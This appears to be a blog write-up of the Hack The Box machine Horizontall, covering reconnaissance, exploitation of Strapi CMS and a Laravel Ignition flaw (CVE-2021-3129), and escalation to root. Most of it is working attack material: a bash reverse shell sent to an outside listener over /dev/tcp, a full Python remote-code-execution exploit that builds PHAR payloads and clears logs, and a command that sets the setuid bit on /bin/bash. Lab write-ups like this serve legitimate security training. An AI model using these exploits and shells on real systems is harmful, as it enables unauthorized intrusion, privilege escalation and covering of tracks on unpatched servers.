---
layout: single
title: Horizontall - Hack The Box
excerpt: "Horizontall is an easy difficulty Linux machine were only HTTP and SSH services are exposed. Enumeration of the website reveals that it is built using the Vue JS framework. Reviewing the source code of the Javascript file, a new virtual host is discovered. This host contains the 'Strapi Headless CMS' which is vulnerable to two CVEs allowing potential attackers to gain remote code execution on the system as the 'strapi' user. Then, after enumerating services listening only on localhost on the remote machine, a Laravel instance is discovered. In order to access the port that Laravel is listening on, SSH tunnelling is used. The Laravel framework installed is outdated and running on debug mode. Another CVE can be exploited to gain remote code execution through Laravel as 'root'."
date: 2025-05-14
classes: wide
header:
  teaser: /img2/horizontall.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - Information Leakage
  - Port Forwarding
  - Strapi CMS Exploitation
  - Laravel Exploitation
---


## Reconnaissance

- Nmap 

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.11.105
```

![](/img2/Pasted%20image%2020250521142851.png)

- Add domain to local DNS

```bash
echo "10.10.11.105 horizontall.htb" >> /etc/hosts
```

- Whatweb

```bash
whatweb http://horizontall.htb/
```

![](/img2/Pasted%20image%2020250521144005.png)

- Inspect source code

```bash
curl http://horizontall.htb/ | grep href=
```

![](/img2/Pasted%20image%2020250521151913.png)

- Inspect source code files

```bash
curl http://horizontall.htb/js/app.c68eb462.js | grep htb
```

![](/img2/Pasted%20image%2020250521152212.png)

- Whatweb

```bash
whatweb http://api-prod.horizontall.htb
```

![](/img2/Pasted%20image%2020250521152302.png)

## Exploitation

- Strapi Set Password

```bash
searchsploit Strapi
```

![](/img2/Pasted%20image%2020250521152550.png)

```bash
searchsploit -m multiple/webapps/50239.py
```

```bash
python3 50239.py http://api-prod.horizontall.htb
```

![](/img2/Pasted%20image%2020250521152726.png)

- Reverse Shell

```bash
bash -c 'bash -i >& /dev/tcp/10.10.16.7/9000 0>&1'
```

![](/img2/Pasted%20image%2020250521153004.png)

```bash
nc -nlvp 9000
```

## Post-exploitation

- Check internal ports

```bash
netstat -nlpt
```

![](/img2/Pasted%20image%2020250521160104.png)

- Check port 8000 website

```bash
curl localhost:8000
```

![](/img2/Pasted%20image%2020250521160214.png)

- CVE-2021-3129 Lavarel RCE

```python
#!/usr/bin/env python3
import requests
import subprocess
import re
import os
import sys


# Send a post request with a specific viewFile value, returning HTTP response
def send(url='', viewfile=''):
    headers = {
        "Accept": "application/json"
    }
    data = {
        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters": {
            "variableName": "whateverYouWant",
            "viewFile": ""
        }
    }
    data['parameters']['viewFile'] = viewfile
    resp = requests.post(url, json=data, headers=headers, verify=False)
    return resp


# Generate payload and return it as text
def generate(chain='', command=''):
    # Ensure that we have PHPGGC in current directory, if not we'll clone it
    if os.path.exists("phpggc"):
        print("[+] PHPGGC found. Generating payload and deploy it to the target")
    else:
        print("[i] PHPGGC not found. Cloning it")
        os.system("git clone https://github.com/ambionics/phpggc.git")
    payload = subprocess.getoutput(
        r"php -d'phar.readonly=0' ./phpggc/phpggc '%s' system '%s' --phar phar -o php://output | base64 -w0 | "
        r"sed -E 's/./\0=00/g; s/==/=3D=/g; s/$/=00/g'" % (chain, command))
    return payload


# Clear logs,
def clear(url):
    print("[i] Trying to clear logs")
    while (send(url,
                "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf"
                "-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log").status_code != 200):
        continue
    print("[+] Logs cleared")


if __name__ == '__main__':
    if len(sys.argv) < 4:
        print("Usage:   %s <URL> <CHAIN> <CMD>" % sys.argv[0])
        print("Example: %s http(s)://localhost:8000 Monolog/RCE1 whoami" % sys.argv[0])
        print("I recommend to use Monolog/RCE1 or Monolog/RCE2 as CHAIN")
        exit(1)
    url = sys.argv[1] + "/_ignition/execute-solution"
    chain = sys.argv[2]
    command = sys.argv[3]

    # Step 1. Clear logs, write the first log entry
    clear(url)
    send(url, "AA")

    # Step 3. Write the second log entry with encoded PHAR payload
    send(url, generate(chain, command))

    # Step 4. Convert log file to a valid PHAR
    if (send(url,
             "php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64"
             "-decode/resource=../storage/logs/laravel.log").status_code == 200):
        print("[+] Successfully converted logs to PHAR")
    else:
        print("[-] Fail to convert logs to PHAR")

    # Step 5. Trigger PHAR deserialization, extract the output
    response = send(url, "phar://../storage/logs/laravel.log")
    result = re.sub("{[\s\S]*}", "", response.text)
    if result:
        print("[+] PHAR deserialized. Exploited\n")
        print(result)
    else:
        print("[i] There is no output")

    # Clear logs
    clear(url)
```

```bash
git clone https://github.com/ambionics/phpggc.git/ 
tar -cvf phpggc.tar phpggc
python3 -m http.server
```

```bash
curl -o phpggc.tar http://10.10.16.7:8000/phpggc.tar
tar -xf phpggc
```

```bash
python3 exploit.py http://localhost:8000 Monolog/RCE1 "chmod u+s /bin/bash"
```

![](/img2/Pasted%20image%2020250521162225.png)

![](/img2/Pasted%20image%2020250521162148.png)